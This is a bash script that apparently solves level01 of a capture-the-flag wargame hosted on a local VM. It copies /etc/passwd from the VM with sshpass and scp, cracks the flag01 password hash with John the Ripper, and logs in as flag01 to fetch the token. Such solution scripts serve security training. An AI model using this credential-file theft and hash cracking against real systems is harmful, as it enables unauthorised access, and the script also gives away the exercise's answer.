#!/bin/bash

VM_ID='192.168.56.3'

if [ ! -f "../../level00/flag" ]; then
    echo "../../level00/flag does not exist"
    exit 1
fi

level01_password=$(cat ../../level00/flag)

sshpass -p "${level01_password}" scp scp://level01@${VM_ID}:4242//etc/passwd passwd 2> /dev/null

if [ "$?" -ne 0 ]; then
    echo "Getting the file passwd failed"
    exit 1
fi

flag_password=$(john passwd --show -users:flag01)

if [ "$?" -ne 0 ]; then
    echo "john failed"
    exit 1
fi

flag_password=$(echo "${flag_password}" | grep --color=never --only '^flag01:[a-zA-Z0-9_-]\+:' | sed 's/^flag01:\([a-zA-Z0-9_-]\+\):.*/\1/g')

if [ "$?" -ne 0 ]; then
    echo "getting the password of the flag01 failed"
    exit 1
fi

token="$(sshpass -p "${flag_password}" ssh flag01@${VM_ID} -p 4242 getflag 2> /dev/null)"

token="$(echo "${token}" | sed 's/Check flag.Here is your token : \(\S\+\)/\1/' | head -n 1)"

echo "found by script:"
echo "${token}"
echo
echo "from level${ACTUAL_LEVEL}/flag:"
cat ../flag

echo "${token}" > tmp_flag
diff ../flag tmp_flag
rm -f tmp_flag
